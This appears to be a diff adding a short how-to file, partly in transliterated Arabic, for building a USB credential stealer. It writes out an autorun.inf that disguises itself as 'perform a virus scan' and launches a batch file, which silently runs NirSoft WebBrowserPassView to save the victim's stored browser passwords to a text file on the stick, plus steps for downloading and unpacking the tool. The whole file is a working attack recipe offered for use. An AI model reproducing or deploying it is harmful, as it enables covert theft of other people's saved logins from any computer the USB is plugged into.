@@ -1,0 +1,32 @@
+create text file in usb
+open it
+in file write the following
+{(curl braces ma elon 3azi)
+[autorun]
+open=launch.bat
+ACTION=perform a virus scan
+
+
+save the file as autorun.inf
+}
+
+open new text file in usb  and write
+{
+
+start WebBrowserPassView.exe /WebBrowserPassView.txt
+
+}
+
+save the file as launch.bat
+
+open the website nirsoft
+ 
+install the files in the websites and click them
+search for download and download the file as a zip file
+ 
+write click on the zip file and cut it and send it to the usb
+
+extract the file
+it request a pass
+take it from the site underdownload buttun
+
